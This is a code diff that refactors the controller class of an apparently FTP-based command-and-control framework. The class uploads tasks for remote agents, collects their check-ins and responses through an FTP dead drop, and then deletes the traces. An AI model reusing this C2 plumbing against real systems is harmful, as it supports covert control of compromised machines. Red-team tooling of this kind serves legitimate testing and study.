@@ -12,41 +12,27 @@
 using FtpAgent;
 using FtpC2.Responses;
 using FtpC2.Tasks;
-using System;
 using System.Collections.Concurrent;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
 using System.Text.Json;
-using System.Threading.Tasks;
 
 namespace FtpC2
 {
-    internal class C2Protocol
-    {        
-        private readonly FtpHelper? FTP;        
-
+    internal class C2Protocol : ProtocolBase 
+    {
         public C2Protocol(string host, string username, string password, bool secure)
-        {
-            this.FTP = new(host, username, password, secure);
-        }
+            : base(host, username, password, secure)
+        { }
 
         public void RegisterNewTask(TaskWrapper task)
         {
-            if (this.FTP == null)
-                return;            
-
             string jsonData = JsonSerializer.Serialize(task, task.GetType());            
 
-            this.FTP.UploadString(jsonData, $"{Shared.PlaceHolders.TaskRequest}.{task.Id}.{task.AgentId}");
+            UploadString(jsonData, $"{Shared.PlaceHolders.TaskRequest}.{task.Id}.{task.AgentId}");
         }
 
         public void RefreshAgents(ConcurrentDictionary<Guid /* AgentId */, Agent> agents)
         {
-            if (this.FTP == null)
-                return;
-
-            List<string> files = this.FTP.ListDirectory();
+            List<string> files = ListDirectory();
 
             foreach (string file in files)
             {
@@ -60,7 +46,7 @@ namespace FtpC2
                     
                     Guid agentSession = Guid.Parse(pieces[1]);
 
-                    string jsonData = this.FTP.DownloadString(file);
+                    string jsonData = DownloadString(file);
 
                     Agent? agent = JsonSerializer.Deserialize<Agent>(jsonData);
 
@@ -75,7 +61,7 @@ namespace FtpC2
                     //  resource consumption.
                     try
                     {
-                        this.FTP.DeleteFile(file);
+                        DeleteFile(file);
                     }
                     catch { }
                 }                    
@@ -84,10 +70,7 @@ namespace FtpC2
         
         public void EnumerateResponses(ConcurrentDictionary<Guid /* Agent */, ResponseWrapper> responses)
         {
-            if (this.FTP == null)
-                return;
-
-            List<string> files = this.FTP.ListDirectory();
+            List<string> files = ListDirectory();
 
             foreach (string file in files)
             {
@@ -102,7 +85,7 @@ namespace FtpC2
                     Guid taskSession = Guid.Parse(pieces[1]);
                     Guid agentSession = Guid.Parse(pieces[2]);                        
                 
-                    string jsonData = this.FTP.DownloadString(file);
+                    string jsonData = DownloadString(file);
 
                     ResponseWrapper? wrappedResponse = JsonSerializer.Deserialize<ResponseWrapper>(jsonData);
                     ResponseWrapper? response = null;
@@ -144,7 +127,7 @@ namespace FtpC2
                     //  resource consumption.
                     try
                     {
-                        this.FTP.DeleteFile(file);
+                        DeleteFile(file);
                     }
                     catch { }
                 }
